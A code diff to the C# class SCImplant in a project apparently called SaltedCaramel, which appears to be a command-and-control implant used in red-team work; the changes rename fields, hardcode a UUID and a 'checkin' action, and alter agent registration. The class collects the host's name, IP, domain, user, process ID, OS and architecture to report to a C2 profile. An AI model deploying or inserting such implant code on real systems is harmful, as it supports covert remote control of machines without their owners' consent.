@@ -22,18 +22,18 @@ namespace SaltedCaramel
     public class SCImplant
     {
         private const int MAX_RETRIES = 20;
-        public string CallbackID;
+        public string action = "checkin";
         
-        public List<Job> JobList;
-        public string Host;
-        public string IP;
-        public int PID;
-        public int SleepInterval;
-        public string UserName;
-        public string UUID = "UUID";
-        public string DomainName;
-        public string OS;
-        public string Architecture;
+        internal List<Job> JobList;
+        public string host;
+        public string ip;
+        public int pid;
+        internal int SleepInterval;
+        public string user;
+        public string uuid = "c1aa85e3-a62b-439e-912a-00560a4a1e21";
+        public string domain;
+        public string os;
+        public string architecture;
 
         public C2Profile Profile;
 
@@ -42,17 +42,17 @@ namespace SaltedCaramel
         public SCImplant(C2Profile profileInstance, int sleepTime=5000)
         {
             Profile = profileInstance;
-            IP = Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString();
-            Host = Dns.GetHostName();
-            DomainName = Environment.UserDomainName;
-            PID = Process.GetCurrentProcess().Id;
-            OS = Environment.OSVersion.VersionString;
+            ip = Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString();
+            host = Dns.GetHostName();
+            domain = Environment.UserDomainName;
+            pid = Process.GetCurrentProcess().Id;
+            os = Environment.OSVersion.VersionString;
             if (IntPtr.Size == 8)
-                Architecture = "x64";
+                architecture = "x64";
             else
-                Architecture = "x86";
+                architecture = "x86";
             SleepInterval = sleepTime;
-            UserName = Environment.UserName;
+            user = Environment.UserName;
             //Endpoint = serverEndpoint;
             JobList = new List<Job>();
         }
@@ -70,8 +70,8 @@ namespace SaltedCaramel
             {
                 try
                 {
-                    string callbackID = Profile.RegisterAgent(this);
-                    CallbackID = callbackID;
+                    string newUUID = Profile.RegisterAgent(this);
+                    uuid = newUUID;
                     retryCount = 0;
                     return true;
                 } catch (Exception ex)
